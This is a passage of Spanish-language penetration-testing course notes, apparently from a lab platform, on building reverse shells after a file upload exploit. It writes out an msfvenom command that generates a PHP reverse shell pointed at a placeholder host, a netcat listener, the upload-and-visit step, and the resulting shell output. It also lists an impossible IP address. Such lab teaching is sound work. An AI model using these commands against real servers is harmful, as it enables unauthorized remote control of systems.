# Upload Exploitation

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Como podemos ver, recibimos con éxito una conexión desde el servidor back-end que aloja la aplicación web vulnerable, lo que nos permite interactuar con ella para su posterior explotación. El mismo concepto se puede utilizar para otros marcos y lenguajes web, con la única diferencia del script de shell inverso que utilizamos.

***

## Generación de scripts de shell inverso personalizados

Al igual que los shells web, también podemos crear nuestros propios scripts de shell inverso. Si bien es posible utilizar la misma función `system` y pasarle un comando de shell inverso, esto puede no ser siempre muy confiable, ya que el comando puede fallar por muchas razones, al igual que cualquier otro comando de shell inverso.

Es por esto que siempre es mejor utilizar las funciones principales del marco web para conectarnos a nuestra máquina. Sin embargo, puede que esto no sea tan fácil de memorizar como un script de shell web. Afortunadamente, herramientas como `msfvenom` pueden generar un script de shell inverso en muchos idiomas e incluso puede intentar eludir ciertas restricciones vigentes. Podemos hacerlo de la siguiente manera para `PHP`:

{% stepper %}
{% step %}
### Generar el payload PHP con msfvenom

Generamos un script de shell inverso en PHP con `msfvenom` y lo guardamos como `reverse.php`.

{% code title="Generar reverse.php" %}
```shell-session
OsmanMartinez@htb[/htb]$ msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
...SNIP...
Payload size: 3033 bytes
```
{% endcode %}
{% endstep %}

{% step %}
### Iniciar el listener

Iniciamos un `netcat` oyente en el puerto especificado (`OUR_PORT`) para aceptar la conexión inversa.

{% code title="Iniciar listener (nc)" %}
```shell-session
OsmanMartinez@htb[/htb]$ nc -lvnp OUR_PORT
listening on [any] OUR_PORT ...
connect to [OUR_IP] from (UNKNOWN) [181.151.182.286] 56232
```
{% endcode %}
{% endstep %}

{% step %}
### Subir y ejecutar el script en el servidor objetivo

Subimos el `reverse.php` generado al servidor vulnerable y visitamos su enlace para ejecutar el payload. Si todo va bien, recibiremos una conexión reversa y podremos interactuar con la máquina.

Ejemplo de salida obtenida tras la conexión:

{% code title="Conexión establecida - salida de id" %}
```
# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
{% endcode %}
{% endstep %}
{% endstepper %}

De manera similar, podemos generar scripts de shell inverso para varios idiomas. Podemos utilizar muchas cargas útiles de shell inverso con la opción `-p` y especificar el idioma de salida con la opción `-f`.

{% hint style="info" %}
Los shells inversos suelen preferirse frente a los shells web, ya que proporcionan un método más interactivo para controlar el servidor comprometido. Sin embargo, pueden fallar por razones como firewalls en la red back-end que impidan conexiones salientes o servidores web que desactiven las funciones necesarias para iniciar la conexión. En esos casos puede ser necesario confiar en shells web.
{% endhint %}
